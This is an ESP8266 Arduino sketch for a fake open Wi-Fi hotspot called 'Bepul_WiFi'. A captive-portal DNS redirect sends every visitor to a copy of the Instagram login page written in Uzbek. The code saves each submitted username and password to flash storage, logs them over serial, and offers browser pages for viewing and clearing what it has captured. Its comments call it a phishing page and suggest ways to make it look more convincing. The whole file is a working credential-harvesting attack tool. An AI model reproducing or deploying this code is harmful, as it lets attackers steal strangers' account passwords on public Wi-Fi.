#include <ESP8266WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <LittleFS.h> // Include the LittleFS library for file system operations

// --- Configuration ---
const char* AP_SSID = "Bepul_WiFi"; // The name of the fake Wi-Fi network
const IPAddress AP_IP(172, 20, 0, 1); // Changed to a less common private IP range
const byte DNS_PORT = 53; // Standard DNS port
const char* CREDENTIALS_FILE = "/credentials.txt"; // File to store captured credentials

// --- Web Server and DNS Server Objects ---
DNSServer dnsServer;
AsyncWebServer server(80); // Web server on port 80

// --- HTML Content for Phishing Page (Improved UI) ---
const char* PHISHING_HTML = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
            color: #262626;
        }
        .main-container {
            width: 100%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px 30px;
            text-align: center;
            border-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
        }
        .logo {
            width: 175px;
            height: 51px;
            margin: 0 auto 20px;
            display: block;
        }
        .instruction-text {
            font-size: 14px;
            color: #8e8e8e;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        input {
            width: calc(100% - 22px);
            padding: 11px;
            margin: 6px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
            font-size: 13px;
            background: #fafafa;
        }
        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #0095f6;
            border: none;
            color: white;
            font-weight: bold;
            font-size: 14px;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s ease;
        }
        button:hover {
            background: #007bb5;
        }
        .or-separator {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
            font-size: 13px;
            color: #8e8e8e;
        }
        .or-separator::before, .or-separator::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .or-separator:not(:empty)::before {
            margin-right: .25em;
        }
        .or-separator:not(:empty)::after {
            margin-left: .25em;
        }
        .fb-login {
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            margin-top: 20px;
            cursor: pointer;
        }
        .forgot-password {
            font-size: 12px;
            color: #385185;
            margin-top: 15px;
            cursor: pointer;
            text-decoration: none;
        }
        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            border-radius: 4px;
            font-size: 14px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
        }
        .signup-box a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
    </style>
    <script>
        if (window.history.replaceState) {
            window.history.replaceState(null, null, window.location.href);
        }
    </script>
</head>
<body>
    <div class="main-container">
        <div class="login-box">
            <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/PjwhRE9DVFlQRSBzdmcgIFBVQkxJQyAnLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4nICAnaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkJz48c3ZnIGhlaWdodD0iMTAwJSIgc3R5bGU9ImZpbGwtcnVsZTpldmVub2RkO2NsaXAtcnVsZTpldmVub2RkO3N0cm9rZS1saW5lam9pbjpyb3VuZDtzdHJva2UtbWl0ZXJsaW1pdDoxLjQxNDIxOyIgdmVyc2lvbj0iMS4xIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIxMDAlIiB4bWw6c3BhY2U9InByZXNlcnZlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnNlcmlmPSJodHRwOi8vd3d3LnNlcmlmLmNvbS8iIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj48cmVjdCBoZWlnaHQ9IjI0IiBpZD0iQXJ0Ym9hcmQxMCIgc3R5bGU9ImZpbGw6bm9uZTsiIHdpZHRoPSIyNCIgeD0iMCIgeT0iMCIvPjxwYXRoIGQ9Ik0yMiw3YzAsLTIuNzYxIC0yLjIzOSwtNSAtNSwtNWMtMy4wNTQsMCAtNi45NDYsMCAtMTAsMGMtMi43NjEsMCAtNSwyLjIzOSAtNSw1YzAsMy4wNTQgMCw2Ljk0NiAwLDEwYzAsMi43NjEgMi4yMzksNSA1LDVjMy4wNTQsMCA2Ljk0NiwwIDEwLDBjMi43NjEsMCA1LC0yLjIzOSA1LC01YzAsLTMuMDU0IDAsLTYuOTQ2IDAsLTEwWiIgc3R5bGU9ImZpbGw6dXJsKCNfUmFkaWFsMSk7Ii8+PHBhdGggZD0iTTE0Ljk1OCw1LjAwNWMyLjA5MSwwLjAyIDQuMDE2LDEuODE1IDQuMDM3LDQuMDM3YzAuMDA3LDEuOTcyIDAuMDA3LDMuOTQ0IDAsNS45MTZjLTAuMDIsMi4wODMgLTEuODE1LDQuMDE2IC00LjAzNyw0LjAzN2MtMS45NzIsMC4wMDcgLTMuOTQ0LDAuMDA3IC01LjkxNiwwYy0yLjA5MiwtMC4wMiAtNC4wMTYsLTEuODE1IC00LjAzNywtNC4wMzdjLTAuMDA3LC0xLjk3MiAtMC4wMDcsLTMuOTQ0IDAsLTUuOTE2YzAuMDE5LC0yLjA5MyAxLjgxLC00LjAxNiA0LjAzNywtNC4wMzdjMS45NzIsLTAuMDA3IDMuOTQ0LC0wLjAwNyA1LjkxNiwwWm0tNS44ODksMC45NDVjLTEuNjIzLDAuMDA1IC0zLjEwMywxLjQxMiAtMy4xMTksMy4wOThjLTAuMDA2LDEuOTY4IC0wLjAwNiwzLjkzNiAwLDUuOTA0YzAuMDE1LDEuNjA1IDEuMzg4LDMuMDgyIDMuMDk4LDMuMDk4YzEuOTY4LDAuMDA2IDMuOTM2LDAuMDA2IDUuOTA0LDBjMS42MDksLTAuMDE1IDMuMDgyLC0xLjM4OCAzLjA5OCwtMy4wOThjMC4wMDYsLTEuOTY4IDAuMDA2LC0zLjkzNiAwLC01LjkwNGMtMC4wMTUsLTEuNjE2IC0xLjQxNSwtMy4wODIgLTMuMDk4LC0zLjA5OGMtMS45NjEsLTAuMDA2IC0zLjkyMiwwIC01Ljg4MywwWiIgc3R5bGU9ImZpbGw6I2ZmZjtmaWxsLXJ1bGU6bm9uemVybzsiLz48cGF0aCBkPSJNMTIuMDI0LDguNWMxLjYxOCwwLjAxNSAzLjEyNiwxLjI2MyAzLjQyMiwyLjg2MmMwLjIxMSwxLjE0IC0wLjE4NywyLjM3NiAtMS4wMjcsMy4xNzhjLTAuOTM1LDAuODkgLTIuMzgyLDEuMjA4IC0zLjYyMiwwLjc1NGMtMS4zODYsLTAuNTA3IC0yLjM2MSwtMS45NjggLTIuMjk2LC0zLjQ0OGMwLjA3OSwtMS43NjggMS42NDEsLTMuMzQgMy40OTksLTMuMzQ2YzAuMDA4LDAgMC4wMTYsMCAwLjAyNCwwWm0tMC4wNCwwLjk0N2MtMS4xNTUsMC4wMTEgLTIuMjQ0LDAuODg3IC0yLjQ4NCwyLjAyNWMtMC4yNDMsMS4xNTEgMC40MTksMi40MjggMS41MDYsMi44ODdjMS4xODcsMC41MDIgMi43MiwtMC4wNjEgMy4yOTMsLTEuMjMzYzAuNTkzLC0xLjIxMSAwLjAzNCwtMi44NTYgLTEuMjE4LC0zLjQ0MWMtMC4zNDEsLTAuMTU5IC0wLjcyLC0wLjIzOSAtMS4wOTcsLTAuMjM4WiIgc3R5bGU9ImZpbGw6I2ZmZjtmaWxsLXJ1bGU6bm9uemVybzsiLz48cGF0aCBkPSJNMTYuNSw4LjIyN2MwLC0wLjE5MyAtMC4wNzcsLTAuMzc4IC0wLjIxMywtMC41MTRjLTAuMTM2LC0wLjEzNiAtMC4zMjEsLTAuMjEzIC0wLjUxNCwtMC4yMTNjLTAuMDE1LDAgLTAuMDMxLDAgLTAuMDQ2LDBjLTAuMTkzLDAgLTAuMzc4LDAuMDc3IC0wLjUxNCwwLjIxM2MtMC4xMzYsMC4xMzYgLTAuMjEzLDAuMzIxIC0wLjIxMywwLjUxNGMwLDAuMDA4IDAsMC4wMTUgMCwwLjAyM2MwLDAuMTk5IDAuMDc5LDAuMzkgMC4yMiwwLjUzYzAuMTQsMC4xNDEgMC4zMzEsMC4yMiAwLjUzLDAuMjJjMCwwIDAsMCAwLDBjMC40MTQsMCAwLjc1LC0wLjMzNiAwLjc1LC0wLjc1YzAsLTAuMDA4IDAsLTAuMDE1IDAsLTAuMDIzWiIgc3R5bGU9ImZpbGw6I2ZmZjsiLz48ZGVmcz48cmFkaWFsR3JhZGllbnQgY3g9IjAiIGN5PSIwIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDI3LjkzMywwLDAsMjcuOTMzLDIsMjEuNSkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBpZD0iX1JhZGlhbDEiIHI9IjEiPjxzdG9wIG9mZnNldD0iMCIgc3R5bGU9InN0b3AtY29sb3I6I2ZmODEwMDtzdG9wLW9wYWNpdHk6MSIvPjxzdG9wIG9mZnNldD0iMC4xOSIgc3R5bGU9InN0b3AtY29sb3I6I2ZmNzIwOTtzdG9wLW9wYWNpdHk6MSIvPjxzdG9wIG9mZnNldD0iMC4zMiIgc3R5bGU9InN0b3AtY29sb3I6I2Y1NWUxNjtzdG9wLW9wYWNpdHk6MSIvPjxzdG9wIG9mZnNldD0iMC40OCIgc3R5bGU9InN0b3AtY29sb3I6I2Q5MjkzODtzdG9wLW9wYWNpdHk6MSIvPjxzdG9wIG9mZnNldD0iMSIgc3R5bGU9InN0b3AtY29sb3I6IzkxMDBmZjtzdG9wLW9wYWNpdHk6MSIvPjwvcmFkaWFsR3JhZGllbnQ+PC9kZWZzPjwvc3ZnPg==" alt="Instagram" class="logo">
            <p class="instruction-text">Wi-Fi ga ulanish uchun Instagram orqali ulaning</p>
            <form method='POST' action='/login'>
                <input name='username' placeholder='Foydalanuvchi nomi' required autofocus><br>
                <input name='password' type='password' placeholder='Parol' required><br>
                <button type='submit'>Kirish</button>
            </form>
            <div class="or-separator">YOKI</div>
            <div class="fb-login">Log in with Facebook</div>
            <a href="#" class="forgot-password">Parolni unutdingizmi?</a>
        </div>
        <div class="signup-box">
            Hisobingiz yo'qmi? <a href="#">Ro'yxatdan o'ting</a>
        </div>
    </div>
</body>
</html>
)rawliteral";

// --- HTML Content for Connection Page (Improved UI) ---
const char* CONNECTING_HTML = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>Ulanilmoqda...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            text-align: center;
            color: #262626;
        }
        .message-container {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 50px 30px;
            border-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
            width: 100%;
            max-width: 360px;
            box-sizing: border-box;
        }
        h2 {
            color: #262626;
            font-size: 24px;
            margin-bottom: 15px;
        }
        p {
            color: #8e8e8e;
            font-size: 16px;
            margin-bottom: 30px;
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #0095f6;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="message-container">
        <div class="spinner"></div>
        <h2>Ulanilmoqda...</h2>
        <p>Iltimos, sizni ulayotganimizda kuting.</p>
    </div>
</body>
</html>
)rawliteral";

// Function to append credentials to a file
void saveCredentials(const String& username, const String& password) {
  File file = LittleFS.open(CREDENTIALS_FILE, "a"); // 'a' for append mode
  if (!file) {
    Serial.println("[ERROR] Failed to open file for appending");
    return;
  }
  String logEntry = "Username: " + username + ", Password: " + password + "\n";
  if (file.print(logEntry)) {
    Serial.println("[*] Credentials saved to LittleFS.");
  } else {
    Serial.println("[ERROR] Failed to write to file.");
  }
  file.close();
}

void setup() {
  Serial.begin(115200);
  delay(500); // Give serial a moment to initialize

  Serial.println("\n--- Starting Wi-Fi Captive Portal ---");

  // --- Initialize LittleFS ---
  if (!LittleFS.begin()) {
    Serial.println("[ERROR] An Error has occurred while mounting LittleFS");
    return; // Stop if LittleFS fails to mount
  }
  Serial.println("[*] LittleFS mounted successfully.");

  // --- Configure Wi-Fi in Access Point (AP) mode ---
  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID);
  // Set AP IP, Gateway, Subnet (all to AP_IP for captive portal redirection)
  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
  delay(100);

  Serial.print("[*] Access Point Name: ");
  Serial.println(AP_SSID);
  Serial.print("[*] Access Point IP Address: ");
  Serial.println(WiFi.softAPIP());

  // --- Start DNS Server for Captive Portal ---
  // Redirects all DNS requests to our AP_IP
  dnsServer.start(DNS_PORT, "*", AP_IP);
  Serial.println("[*] DNS Server Started");

  // --- Handle all requests (Captive Portal) ---
  // Any request not explicitly defined will be redirected to the phishing page
  server.onNotFound([](AsyncWebServerRequest *request) {
    Serial.print("[!] Client Connected: ");
    Serial.println(request->client()->remoteIP());
    request->send(200, "text/html", PHISHING_HTML);
  });

  // --- Handle POST requests to /login ---
  // This is where captured credentials are processed
  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
    String username = "";
    String password = "";

    // Check if parameters exist before accessing them
    if (request->hasParam("username", true)) {
      username = request->getParam("username", true)->value();
    }
    if (request->hasParam("password", true)) {
      password = request->getParam("password", true)->value();
    }

    Serial.println("\n--- Captured Wi-Fi Credentials ---");
    Serial.print("Username: ");
    Serial.println(username);
    Serial.print("Password: ");
    Serial.println(password);
    Serial.println("----------------------------------");

    // Save credentials to LittleFS
    saveCredentials(username, password);

    // Send a "connecting" page to the user
    request->send(200, "text/html", CONNECTING_HTML);

    // Optional: Add a delay or redirect after a few seconds to make it seem more realistic
    // For a real scenario, you might want to redirect them to a legitimate site
  });

  // --- Handle GET requests to /logs ---
  // Allows viewing captured credentials from a browser
  server.on("/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
    Serial.println("[*] /logs requested by " + request->client()->remoteIP().toString());
    String content = "<h2>Captured Credentials</h2>";
    File file = LittleFS.open(CREDENTIALS_FILE, "r"); // 'r' for read mode
    if (!file) {
      content += "<p>No credentials captured yet or file not found.</p>";
      Serial.println("[INFO] Credentials file not found.");
    } else {
      content += "<pre>"; // Use <pre> for preformatted text (maintains line breaks)
      while (file.available()) {
        content += file.readStringUntil('\n') + "\n";
      }
      content += "</pre>";
      file.close();
    }
    content += "<br><a href='/clear'>Clear Logs</a> | <a href='/'>Back to Phishing Page</a>";
    request->send(200, "text/html", content);
  });

  // --- Handle GET requests to /clear ---
  // Allows clearing captured credentials from a browser
  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request) {
    Serial.println("[*] /clear requested by " + request->client()->remoteIP().toString());
    if (LittleFS.remove(CREDENTIALS_FILE)) {
      Serial.println("[*] Credentials file cleared.");
      request->send(200, "text/html", "<h2>Credentials Cleared</h2><p>The credentials log has been successfully cleared.</p><br><a href='/logs'>View Logs</a> | <a href='/'>Back to Phishing Page</a>");
    } else {
      Serial.println("[ERROR] Failed to clear credentials file.");
      request->send(500, "text/html", "<h2>Error</h2><p>Failed to clear the credentials log.</p><br><a href='/logs'>View Logs</a> | <a href='/'>Back to Phishing Page</a>");
    }
  });

  // --- Handle GET requests to /view ---
  // New endpoint to view credentials in a clean format
  server.on("/view", HTTP_GET, [](AsyncWebServerRequest *request) {
    String content = "<!DOCTYPE html><html><head>";
    content += "<title>Captured Credentials</title>";
    content += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
    content += "<style>";
    content += "body { font-family: Arial, sans-serif; margin: 20px; }";
    content += "table { border-collapse: collapse; width: 100%; }";
    content += "th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }";
    content += "th { background-color: #f2f2f2; }";
    content += "tr:nth-child(even) { background-color: #f9f9f9; }";
    content += "</style></head><body>";
    content += "<h2>Captured Credentials</h2>";
    content += "<table><tr><th>Username</th><th>Password</th></tr>";
    
    File file = LittleFS.open(CREDENTIALS_FILE, "r");
    if (!file) {
      content += "<tr><td colspan='2'>No credentials captured yet</td></tr>";
    } else {
      while (file.available()) {
        String line = file.readStringUntil('\n');
        int usernameStart = line.indexOf("Username: ") + 10;
        int usernameEnd = line.indexOf(", Password: ");
        int passwordStart = line.indexOf("Password: ") + 10;
        
        if (usernameStart > 9 && usernameEnd > 0 && passwordStart > 9) {
          String username = line.substring(usernameStart, usernameEnd);
          String password = line.substring(passwordStart);
          content += "<tr><td>" + username + "</td><td>" + password + "</td></tr>";
        }
      }
      file.close();
    }
    
    content += "</table>";
    content += "<p><a href='/clear'>Clear All Credentials</a></p>";
    content += "</body></html>";
    
    request->send(200, "text/html", content);
  });

  // --- Start the web server ---
  server.begin();
  Serial.println("[*] Web Server Started");
}

void loop() {
  // Process DNS requests to ensure the captive portal redirection works
  dnsServer.processNextRequest();
}